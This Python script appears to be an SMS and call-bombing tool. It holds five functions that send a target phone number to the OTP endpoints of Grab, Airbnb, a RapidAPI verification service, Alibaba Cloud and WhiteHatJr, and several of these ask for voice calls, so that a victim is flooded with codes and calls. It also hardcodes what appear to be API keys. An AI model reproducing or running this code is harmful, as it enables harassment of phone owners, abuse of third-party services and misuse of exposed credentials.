#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

def grab(phone): #84943687522
	link = "https://api.grab.com/grabid/v1/oauth2/otp"
	data = {
		"client_id":"4da4649307cc4bfaa16b08d03432535e",
		"transaction_ctx":"null",
		"country_code":"VN",
		"method":"CALL",
		"num_digits":"6",
		"phone_number":""
		}
	data["phone_number"] = "84"+phone[1:]
	req = requests.post(link,json=data)
	return(req,req.text)


def airbnb(phone): #phone = 84943687522
	link = "https://www.airbnb.co.in/api/v2/phone_one_time_passwords?currency=VND&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=vi"
	data = {
		"phoneNumber":"",
		"workFlow":"GLOBAL_SIGNUP_LOGIN",
		"otpMethod":"CALL"
		}
	data["phoneNumber"] = "84" + phone[1:]
	res = requests.post(link, json = data)
	return(res, res.text)

def rapidapi(phone): #phone = 84943687522
# https://rapidapi.com/wipple/api/wipple-sms-verify-otp/
	phone = "84"+phone[1:]
	url = "https://wipple-sms-verify-otp.p.rapidapi.com/send"
	payload = "{\n    \"app_name\": \"exampleapp\",\n    \"code_length\": 30,\n    \"code_type\": \"number\",\n    \"expiration_second\": 86000,\n    \"phone_number\": \"xxxPHONExxx\"\n}"
	payload = payload.replace("xxxPHONExxx",phone)
	headers = {
	    'content-type': "application/json",
	    'x-rapidapi-key': "0cc733e278mshc6dfccfbf2203f6p16914djsnc108e3d901f5",
	    'x-rapidapi-host': "wipple-sms-verify-otp.p.rapidapi.com"
	    }
	response = requests.request("POST", url, data=payload, headers=headers)
	return(response.text)


def alibabacloud(phone): #943687522
	link = "https://passport.alibabacloud.com/register/checkcode/send_checkcode.do?send_type=sms"
	data = {"mobile":""}
	data["mobile"] = phone[1:]
	res = requests.post(link,data=data)
	return(res,res.text)

def whitehatjr(phone): # 943687522
	phone = phone[1:]
	link = "https://code.whitehatjr.com/api/V1/otp/generate"
	json = {"dialCode":"+84","mobile":phone,"type":"voice"}
	res = requests.post(link,json=json)
	return(res,res.text)


